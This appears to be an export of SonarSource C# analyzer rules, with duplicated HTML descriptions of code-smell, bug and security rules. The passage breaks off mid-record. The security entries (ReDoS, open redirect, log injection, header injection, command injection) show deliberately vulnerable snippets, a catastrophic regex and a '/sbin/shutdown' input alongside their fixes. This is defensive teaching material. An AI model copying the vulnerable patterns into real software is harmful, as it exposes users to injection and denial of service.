</pre>",csharpsquid:S1905,cs,C#,"<p>Unnecessary casting expressions make the code harder to read and understand.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int Example(int i)
{
    return (int) (i + 42); // Noncompliant
}

public IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)
{
    return coll.Reverse().OfType&lt;int&gt;(); // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int Example(int i)
{
    return i + 42;
}

public IEnumerable&lt;int&gt; ExampleCollection(IEnumerable&lt;int&gt; coll)
{
    return coll.Reverse();
}
</pre>
<h2>Exceptions</h2>
<p>Issues are not raised against C# 7.1 `default` literal.</p>
<pre>
bool b = (bool)default; // Doesn't raise an issue
</pre>",Redundant casts should not be used,[],MINOR,"['clumsy', 'redundant']",CODE_SMELL
2015-07-27T14:14:23+0200,"<p><code>readonly</code> fields can only be assigned in a class constructor. If a class has a field that's not marked <code>readonly</code> but is
only set in the constructor, it could cause confusion about the field's intended use. To avoid confusion, such fields should be marked
<code>readonly</code> to make their intended use explicit, and to prevent future maintainers from inadvertently changing their use.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person
{
    private int _birthYear;  // Noncompliant

    Person(int birthYear)
    {
        _birthYear = birthYear;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person
{
    private readonly int _birthYear;

    Person(int birthYear)
    {
        _birthYear = birthYear;
    }
}
</pre>
<h2>Exceptions</h2>
<p> * Fields with attributes are ignored.</p>
<p> * Fields of type <code>struct</code> that are not primitive or pointer types are also ignored because of possible unwanted behavior.</p>
<h2>See</h2>
<p> * <a href=""https://ericlippert.com/2008/05/14/mutating-readonly-structs/"">Mutating readonly structs</a></p>",csharpsquid:S2933,cs,C#,"<p><code>readonly</code> fields can only be assigned in a class constructor. If a class has a field that's not marked <code>readonly</code> but is
only set in the constructor, it could cause confusion about the field's intended use. To avoid confusion, such fields should be marked
<code>readonly</code> to make their intended use explicit, and to prevent future maintainers from inadvertently changing their use.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person
{
    private int _birthYear;  // Noncompliant

    Person(int birthYear)
    {
        _birthYear = birthYear;
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person
{
    private readonly int _birthYear;

    Person(int birthYear)
    {
        _birthYear = birthYear;
    }
}
</pre>
<h2>Exceptions</h2>
<p> * Fields with attributes are ignored.</p>
<p> * Fields of type <code>struct</code> that are not primitive or pointer types are also ignored because of possible unwanted behavior.</p>
<h2>See</h2>
<p> * <a href=""https://ericlippert.com/2008/05/14/mutating-readonly-structs/"">Mutating readonly structs</a></p>","Fields that are only assigned in the constructor should be ""readonly""",[],MAJOR,['confusing'],CODE_SMELL
2017-07-28T12:37:58+0200,"<p>A publicly accessible method can be called from anywhere, which means you should validate parameters to be within the expected constraints. In
general, checking against <code>null</code> is recommended defensive programming.</p>
<p>This rule raises an issue when a parameter of a publicly accessible method is not validated against <code>null</code> before being
dereferenced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
    private MyOtherClass other;

    public void Foo(MyOtherClass other)
    {
        this.other = other; // Compliant: other not being dereferenced
    }

    public void Bar(MyOtherClass other)
    {
        this.other = other.Clone(); // Noncompliant
    }

    protected void FooBar(MyOtherClass other)
    {
        this.other = other.Clone(); // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass
{
    private MyOtherClass other;

    public void Foo(MyOtherClass other)
    {
        this.other = other;
    }

    public void Bar(MyOtherClass other)
    {
        if (other != null)
        {
            this.other = other.Clone();
        }
    }

    protected void FooBar(MyOtherClass other)
    {
        if (other != null)
        {
            this.other = other.Clone();
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>To create a custom null validation method declare an attribute with name <code>ValidatedNotNullAttribute</code> and mark the parameter that is
validated for null in your method declaration with it:</p>
<pre>
using System;

public sealed class ValidatedNotNullAttribute : Attribute { }

public static class Guard
{
    public static void NotNull&lt;T&gt;([ValidatedNotNullAttribute] this T value, string name) where T : class
    {
        if (value == null)
            throw new ArgumentNullException(name);
    }
}

public static class Utils
{
    public static string ToUpper(string value)
    {
        Guard.NotNull(value, nameof(value));
        if (value == null)
        {
            return value.ToString();
        }
        return value.ToUpper(); // Compliant
    }
}
</pre>",csharpsquid:S3900,cs,C#,"<p>A publicly accessible method can be called from anywhere, which means you should validate parameters to be within the expected constraints. In
general, checking against <code>null</code> is recommended defensive programming.</p>
<p>This rule raises an issue when a parameter of a publicly accessible method is not validated against <code>null</code> before being
dereferenced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass
{
    private MyOtherClass other;

    public void Foo(MyOtherClass other)
    {
        this.other = other; // Compliant: other not being dereferenced
    }

    public void Bar(MyOtherClass other)
    {
        this.other = other.Clone(); // Noncompliant
    }

    protected void FooBar(MyOtherClass other)
    {
        this.other = other.Clone(); // Noncompliant
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass
{
    private MyOtherClass other;

    public void Foo(MyOtherClass other)
    {
        this.other = other;
    }

    public void Bar(MyOtherClass other)
    {
        if (other != null)
        {
            this.other = other.Clone();
        }
    }

    protected void FooBar(MyOtherClass other)
    {
        if (other != null)
        {
            this.other = other.Clone();
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>To create a custom null validation method declare an attribute with name <code>ValidatedNotNullAttribute</code> and mark the parameter that is
validated for null in your method declaration with it:</p>
<pre>
using System;

public sealed class ValidatedNotNullAttribute : Attribute { }

public static class Guard
{
    public static void NotNull&lt;T&gt;([ValidatedNotNullAttribute] this T value, string name) where T : class
    {
        if (value == null)
            throw new ArgumentNullException(name);
    }
}

public static class Utils
{
    public static string ToUpper(string value)
    {
        Guard.NotNull(value, nameof(value));
        if (value == null)
        {
            return value.ToString();
        }
        return value.ToUpper(); // Compliant
    }
}
</pre>",Arguments of public methods should be validated against null,[],MAJOR,['convention'],CODE_SMELL
2015-05-20T05:01:17+0200,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks whether or not type names are using PascalCase. To reduce noise,
two consecutive upper case characters are allowed unless they form the whole type name. So, <code>MyXClass</code> is compliant, but <code>XC</code> on
its own is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class my_class {...}
class SOMEName42 {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
class SomeName42 {...}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> The rule ignores types that are marked with <code>ComImportAttribute</code> or <code>InterfaceTypeAttribute</code>. </li>
  <li> The rule allows for two-letter acronyms in which both letters are capitalized, as shown in the following identifier: <code>IOStream</code>
  </li>
  <li> The rule allows having <code>'_'</code> characters in class names inside test projects. </li>
</ul>
<pre>
class Some_Name___42 {...} // valid in test
class Some_name___42 {...} // still not valid
class Some_Name_XC {...} // invalid because of XC, should be Some_Name_Xc
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://docs.microsoft.com/en-us/dotnet/standard/design-guidelines/capitalization-conventions"">Microsoft Capitalization
  Conventions</a> </li>
</ul>",csharpsquid:S101,cs,C#,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks whether or not type names are using PascalCase. To reduce noise,
two consecutive upper case characters are allowed unless they form the whole type name. So, <code>MyXClass</code> is compliant, but <code>XC</code> on
its own is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class my_class {...}
class SOMEName42 {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
class MyClass {...}
class SomeName42 {...}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> The rule ignores types that are marked with <code>ComImportAttribute</code> or <code>InterfaceTypeAttribute</code>. </li>
  <li> The rule allows for two-letter acronyms in which both letters are capitalized, as shown in the following identifier: <code>IOStream</code>
  </li>
  <li> The rule allows having <code>'_'</code> characters in class names inside test projects. </li>
</ul>
<pre>
class Some_Name___42 {...} // valid in test
class Some_name___42 {...} // still not valid
class Some_Name_XC {...} // invalid because of XC, should be Some_Name_Xc
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://docs.microsoft.com/en-us/dotnet/standard/design-guidelines/capitalization-conventions"">Microsoft Capitalization
  Conventions</a> </li>
</ul>",Types should be named in PascalCase,[],MINOR,['convention'],CODE_SMELL
2015-05-20T05:01:17+0200,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks whether or not method and property names are PascalCased. To
reduce noise, two consecutive upper case characters are allowed unless they form the whole name. So, <code>MyXMethod</code> is compliant, but
<code>XM</code> on its own is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int doSomething() {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int DoSomething() {...}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> The rule ignores members in types that are marked with <code>ComImportAttribute</code> or <code>InterfaceTypeAttribute</code>. </li>
  <li> The rule ignores <code>extern</code> methods. </li>
  <li> The rule allows for two-letter acronyms in which both letters are capitalized, as shown in the following identifier:
  <code>ExecuteOnUIThread</code>. </li>
  <li> Furthermore, when <code>'_'</code> character is found in a name, the camel casing is not enforced. </li>
</ul>
<pre>
void My_method(){...} // valid
void My_method_(){...} // invalid, leading and trailing underscores are reported
</pre>
<h2>See</h2>
<p><a href=""https://docs.microsoft.com/en-us/dotnet/standard/design-guidelines/capitalization-conventions"">Microsoft Capitalization
Conventions</a></p>",csharpsquid:S100,cs,C#,"<p>Shared naming conventions allow teams to collaborate efficiently. This rule checks whether or not method and property names are PascalCased. To
reduce noise, two consecutive upper case characters are allowed unless they form the whole name. So, <code>MyXMethod</code> is compliant, but
<code>XM</code> on its own is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int doSomething() {...}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int DoSomething() {...}
</pre>
<h2>Exceptions</h2>
<ul>
  <li> The rule ignores members in types that are marked with <code>ComImportAttribute</code> or <code>InterfaceTypeAttribute</code>. </li>
  <li> The rule ignores <code>extern</code> methods. </li>
  <li> The rule allows for two-letter acronyms in which both letters are capitalized, as shown in the following identifier:
  <code>ExecuteOnUIThread</code>. </li>
  <li> Furthermore, when <code>'_'</code> character is found in a name, the camel casing is not enforced. </li>
</ul>
<pre>
void My_method(){...} // valid
void My_method_(){...} // invalid, leading and trailing underscores are reported
</pre>
<h2>See</h2>
<p><a href=""https://docs.microsoft.com/en-us/dotnet/standard/design-guidelines/capitalization-conventions"">Microsoft Capitalization
Conventions</a></p>",Methods and properties should be named in PascalCase,[],MINOR,['convention'],CODE_SMELL
2017-04-14T12:33:18+0200,"<p>Passing a parameter by reference, which is what happens when you use the <code>out</code> or <code>ref</code> parameter modifiers, means that the
method will receive a pointer to the argument, rather than the argument itself. If the argument was a value type, the method will be able to change
the argument's values. If it was a reference type, then the method receives a pointer to a pointer, which is usually not what was intended. Even when
it is what was intended, this is the sort of thing that's difficult to get right, and should be used with caution.</p>
<p>This rule raises an issue when <code>out</code> or <code>ref</code> is used on a non-<code>Optional</code> parameter in a public method.
<code>Optional</code> parameters are covered by S3447.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void GetReply(
         ref MyClass input, // Noncompliant
         out string reply)  // Noncompliant
{ ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
public string GetReply(MyClass input)
{ ... }

public bool TryGetReply(MyClass input, out string reply)
{ ... }

public ReplyData GetReply(MyClass input)
{ ... }

internal void GetReply(ref MyClass input, out string reply)
{ ... }
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise issues for:</p>
<p>- non-public methods</p>
<p>- methods with only 'out' parameters, name starting with ""Try"" and return type bool.</p>
<p>- interface implementation methods</p>",csharpsquid:S3874,cs,C#,"<p>Passing a parameter by reference, which is what happens when you use the <code>out</code> or <code>ref</code> parameter modifiers, means that the
method will receive a pointer to the argument, rather than the argument itself. If the argument was a value type, the method will be able to change
the argument's values. If it was a reference type, then the method receives a pointer to a pointer, which is usually not what was intended. Even when
it is what was intended, this is the sort of thing that's difficult to get right, and should be used with caution.</p>
<p>This rule raises an issue when <code>out</code> or <code>ref</code> is used on a non-<code>Optional</code> parameter in a public method.
<code>Optional</code> parameters are covered by S3447.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void GetReply(
         ref MyClass input, // Noncompliant
         out string reply)  // Noncompliant
{ ... }
</pre>
<h2>Compliant Solution</h2>
<pre>
public string GetReply(MyClass input)
{ ... }

public bool TryGetReply(MyClass input, out string reply)
{ ... }

public ReplyData GetReply(MyClass input)
{ ... }

internal void GetReply(ref MyClass input, out string reply)
{ ... }
</pre>
<h2>Exceptions</h2>
<p>This rule will not raise issues for:</p>
<p>- non-public methods</p>
<p>- methods with only 'out' parameters, name starting with ""Try"" and return type bool.</p>
<p>- interface implementation methods</p>","""out"" and ""ref"" parameters should not be used",[],CRITICAL,['suspicious'],CODE_SMELL
2015-07-27T14:14:23+0200,"<p>Shared resources should not be used for locking as it increases the chance of deadlocks. Any other thread could acquire (or attempt to acquire) the
same lock for another unrelated purpose. </p>
<p>Instead, a dedicated <code>object</code> instance should be used for each shared resource, to avoid deadlocks or lock contention.</p>
<p>The following objects are considered as shared resources:</p>
<ul>
  <li> <code>this</code> </li>
  <li> a <code>Type</code> object </li>
  <li> a string literal </li>
  <li> a string instance </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void MyLockingMethod()
{
    lock (this) // Noncompliant
    {
        // ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private readonly object lockObj = new object();

public void MyLockingMethod()
{
    lock (lockObj)
    {
        // ...
    }
}
</pre>
<h2>See</h2>
<p><a href=""https://docs.microsoft.com/en-us/dotnet/standard/threading/managed-threading-best-practices"">Microsoft Documentation: Managed Threading
Best Practices</a></p>",csharpsquid:S2551,cs,C#,"<p>Shared resources should not be used for locking as it increases the chance of deadlocks. Any other thread could acquire (or attempt to acquire) the
same lock for another unrelated purpose. </p>
<p>Instead, a dedicated <code>object</code> instance should be used for each shared resource, to avoid deadlocks or lock contention.</p>
<p>The following objects are considered as shared resources:</p>
<ul>
  <li> <code>this</code> </li>
  <li> a <code>Type</code> object </li>
  <li> a string literal </li>
  <li> a string instance </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public void MyLockingMethod()
{
    lock (this) // Noncompliant
    {
        // ...
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private readonly object lockObj = new object();

public void MyLockingMethod()
{
    lock (lockObj)
    {
        // ...
    }
}
</pre>
<h2>See</h2>
<p><a href=""https://docs.microsoft.com/en-us/dotnet/standard/threading/managed-threading-best-practices"">Microsoft Documentation: Managed Threading
Best Practices</a></p>",Shared resources should not be used for locking,[],CRITICAL,['multi-threading'],BUG
2018-06-18T12:48:48+0200,"<p>Evaluating regular expressions against input strings can be an extremely CPU-intensive task. For example, a specially crafted regular expression
such as <code>(a+)++</code> will take several seconds to evaluate the input string,&nbsp;<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is
that every additional ""<code>a""</code> added to the input doubles the time required to evaluate the regex. However, the equivalent regular expression,
<code>a</code> (without grouping), is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door for Denial Of Service attacks. In the context of a web application,
attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the service inaccessible to genuine
users.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class RegexDoS : Controller
{
  // GET /RegexDoS/Validate
  public IActionResult Validate(string regex, string input)
  {
    // Enables attackers to force the web server to evaluate
    // regex such as ""^(a+)+$"" on inputs such as ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!""

    bool match = Regex.IsMatch(input, regex); // Noncompliant

    return Content(""Valid? "" + match);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class RegexDoS : Controller
{
  // GET /RegexDoS/Validate
  public IActionResult Validate(string regex, string input)
  {
    // Option 1: Use a hardcoded regex
    bool match = Regex.IsMatch(input, ""^a+$"");

    // Option 2: Set a timeout on the regex's evaluation
    match = new Regex(regex, RegexOptions.None, TimeSpan.FromMilliseconds(100)).IsMatch(input);

    return Content(""Valid? "" + match);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>",roslyn.sonaranalyzer.security.cs:S2631,cs,C#,"<p>Evaluating regular expressions against input strings can be an extremely CPU-intensive task. For example, a specially crafted regular expression
such as <code>(a+)++</code> will take several seconds to evaluate the input string,&nbsp;<code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is
that every additional ""<code>a""</code> added to the input doubles the time required to evaluate the regex. However, the equivalent regular expression,
<code>a</code> (without grouping), is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door for Denial Of Service attacks. In the context of a web application,
attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the service inaccessible to genuine
users.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class RegexDoS : Controller
{
  // GET /RegexDoS/Validate
  public IActionResult Validate(string regex, string input)
  {
    // Enables attackers to force the web server to evaluate
    // regex such as ""^(a+)+$"" on inputs such as ""aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!""

    bool match = Regex.IsMatch(input, regex); // Noncompliant

    return Content(""Valid? "" + match);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class RegexDoS : Controller
{
  // GET /RegexDoS/Validate
  public IActionResult Validate(string regex, string input)
  {
    // Option 1: Use a hardcoded regex
    bool match = Regex.IsMatch(input, ""^a+$"");

    // Option 2: Set a timeout on the regex's evaluation
    match = new Regex(regex, RegexOptions.None, TimeSpan.FromMilliseconds(100)).IsMatch(input);

    return Content(""Valid? "" + match);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
</ul>",Regular expressions should not be vulnerable to Denial of Service attacks,[],BLOCKER,"['denial-of-service', 'owasp-a1']",VULNERABILITY
2019-03-26T06:42:31+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
performing HTTP redirects based on tainted data could enable an attacker to redirect users to a malicious site to, for example, steal login
credentials.</p>
<p>This problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not perform redirects based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class OpenRedirect : Controller
{
  public IActionResult Test(string url)
  {
    return Redirect(url); // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class OpenRedirect : Controller
{
  private string[] whiteList = { ""https://www.sonarsource.com"" };

  public IActionResult Test(string url)
  {
    // Match the incoming URL against a whitelist
    if (!whiteList.Contains(url))
    {
      return BadRequest();
    }

    return Redirect(url);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/601.html"">MITRE, CWE-601</a> - URL Redirection to Untrusted Site ('Open Redirect') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",roslyn.sonaranalyzer.security.cs:S5146,cs,C#,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
performing HTTP redirects based on tainted data could enable an attacker to redirect users to a malicious site to, for example, steal login
credentials.</p>
<p>This problem could be mitigated in any of the following ways:</p>
<ul>
  <li> Validate the user provided data based on a whitelist and reject input not matching. </li>
  <li> Redesign the application to not perform redirects based on user provided data. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
public class OpenRedirect : Controller
{
  public IActionResult Test(string url)
  {
    return Redirect(url); // Noncompliant
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class OpenRedirect : Controller
{
  private string[] whiteList = { ""https://www.sonarsource.com"" };

  public IActionResult Test(string url)
  {
    // Match the incoming URL against a whitelist
    if (!whiteList.Contains(url))
    {
      return BadRequest();
    }

    return Redirect(url);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control"">OWASP Top 10 2017</a> - Category A5 - Broken Access Control
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/601.html"">MITRE, CWE-601</a> - URL Redirection to Untrusted Site ('Open Redirect') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
</ul>",HTTP request redirections should not be open to forging attacks,[],BLOCKER,"['cwe', 'owasp-a5', 'sans-top25-risky']",VULNERABILITY
2019-03-26T06:42:31+0100,"<p>User provided data, such as URL parameters, POST data payloads or cookies, should always be considered untrusted and tainted. Applications logging
tainted data could enable an attacker to inject characters that would break the log file pattern. This could be used to block monitors and SIEM
(Security Information and Event Management) systems from detecting other malicious events.</p>
<p>This problem could be mitigated by sanitizing the user provided data before logging it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class LogForging : Controller
{
  public IActionResult Test(string id)
  {
    logger.Info(""ID: {0}"", id); // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class LogForging : Controller
{
  public IActionResult Test(string id)
  {
    // Replace pattern-breaking characters
    id = id.Replace('\n', '_').Replace('\r', '_').Replace('\t', '_');

    logger.Info(""ID: {0}"", id);
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Logging_Cheat_Sheet"">OWASP Cheat Sheet</a> - Logging </li>
  <li> <a href=""https://www.owasp.org/index.php/Log_Injection"">OWASP Attack Category</a> - Log Injection </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A1-Injection"">OWASP Top 10 2017</a> - Category A1 - Injection </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",roslyn.sonaranalyzer.security.cs:S5145,cs,C#,"<p>User provided data, such as URL parameters, POST data payloads or cookies, should always be considered untrusted and tainted. Applications logging
tainted data could enable an attacker to inject characters that would break the log file pattern. This could be used to block monitors and SIEM
(Security Information and Event Management) systems from detecting other malicious events.</p>
<p>This problem could be mitigated by sanitizing the user provided data before logging it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class LogForging : Controller
{
  public IActionResult Test(string id)
  {
    logger.Info(""ID: {0}"", id); // Noncompliant
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class LogForging : Controller
{
  public IActionResult Test(string id)
  {
    // Replace pattern-breaking characters
    id = id.Replace('\n', '_').Replace('\r', '_').Replace('\t', '_');

    logger.Info(""ID: {0}"", id);
    // ...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Logging_Cheat_Sheet"">OWASP Cheat Sheet</a> - Logging </li>
  <li> <a href=""https://www.owasp.org/index.php/Log_Injection"">OWASP Attack Category</a> - Log Injection </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A1-Injection"">OWASP Top 10 2017</a> - Category A1 - Injection </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/117.html"">MITRE, CWE-117</a> - Improper Output Neutralization for Logs </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",Logging should not be vulnerable to injection attacks,[],MINOR,"['cwe', 'owasp-a1', 'sans-top25-insecure']",VULNERABILITY
2019-03-26T06:42:31+0100,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to inject characters that would be interpreted as a new line in some
browsers. This could, for example, enable Cross-Site Scripting (XSS) attacks.</p>
<p>Most modern web application frameworks and servers mitigate this type of attack by default, but there might be rare cases where older versions are
still vulnerable. As a best practice, applications that use user provided data to construct the response header should always validate the data first.
Validation should be based on a whitelist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string value = Request.QueryString[""value""];
Response.AddHeader(""X-Header"", value); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
string value = Request.QueryString[""value""];
// Allow only alphanumeric characters
if (value == null || !Regex.IsMatch(value, ""^[a-zA-Z0-9]+$""))
{
  throw new Exception(""Invalid value"");
}
Response.AddHeader(""X-Header"", value);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/HTTP_Response_Splitting"">OWASP Attack Category</a> - HTTP Response Splitting </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/113.html"">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP
  Response Splitting') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",roslyn.sonaranalyzer.security.cs:S5167,cs,C#,"<p>User provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications
constructing HTTP response headers based on tainted data could allow attackers to inject characters that would be interpreted as a new line in some
browsers. This could, for example, enable Cross-Site Scripting (XSS) attacks.</p>
<p>Most modern web application frameworks and servers mitigate this type of attack by default, but there might be rare cases where older versions are
still vulnerable. As a best practice, applications that use user provided data to construct the response header should always validate the data first.
Validation should be based on a whitelist.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string value = Request.QueryString[""value""];
Response.AddHeader(""X-Header"", value); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
string value = Request.QueryString[""value""];
// Allow only alphanumeric characters
if (value == null || !Regex.IsMatch(value, ""^[a-zA-Z0-9]+$""))
{
  throw new Exception(""Invalid value"");
}
Response.AddHeader(""X-Header"", value);
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/HTTP_Response_Splitting"">OWASP Attack Category</a> - HTTP Response Splitting </li>
  <li> <a href=""https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)"">OWASP Top 10 2017</a> - Category A7 - Cross-Site Scripting
  (XSS) </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/79.html"">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  ('Cross-site Scripting') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/113.html"">MITRE, CWE-113</a> - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP
  Response Splitting') </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",HTTP response headers should not be vulnerable to injection attacks,[],MINOR,"['cwe', 'owasp-a7', 'sans-top25-insecure']",VULNERABILITY
2018-06-18T12:48:48+0200,"<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided values used in those commands. Failure to do so could allow an attacker to include input that executes unintended commands or
exposes sensitive data.</p>
<p>The mitigation strategy should be based on whitelisting of allowed characters or commands.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class CommandInjection : Controller
{
  // GET /CommandInjection/Run
  public IActionResult Run(string binary)
  {
    // If the value ""/sbin/shutdown"" is passed as binary and the web server is running as root,
    // then the machine running the web server will be shut down and become unavailable for future requests

    Process p = new Process();
    p.StartInfo.FileName = binary; // Noncompliant
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    return Content(output);
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class CommandInjection : Controller
{
  // GET /CommandInjection/Run
  public IActionResult Run(string binary)
  {
    // Restrict to binaries within the current working directory whose name only contains letters
    if (binary == null || !Regex.IsMatch(binary, ""^[a-zA-Z]+$""))
    {
      return BadRequest();
    }

    Process p = new Process();
    p.StartInfo.FileName = binary; // Now safe
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    string output = p.StandardOutput.ReadToEnd();
    return Content(output);
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/78"">MITRE, CWE-78</a> - Improper Neutralization of Special Elements used in an OS Command </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/88"">MITRE, CWE-88</a> - Argument Injection or Modification </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat1"">SANS Top 25</a> - Insecure Interaction Between Components </li>
</ul>",roslyn.sonaranalyzer.security.cs:S2076,cs,C#,"<p>Applications that execute operating system commands or execute commands that interact with the underlying system should neutralize any
externally-provided values used in those commands. Failure to do so could allow an attacker to include input that executes unintended commands or
exposes sensitive data.</p>
<p>The mitigation strategy should be based on whitelisting of allowed characters or commands.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class CommandInjection : Controller
{
  // GET /CommandInjection/Run
  public IActionResult Run(string binary)
  {
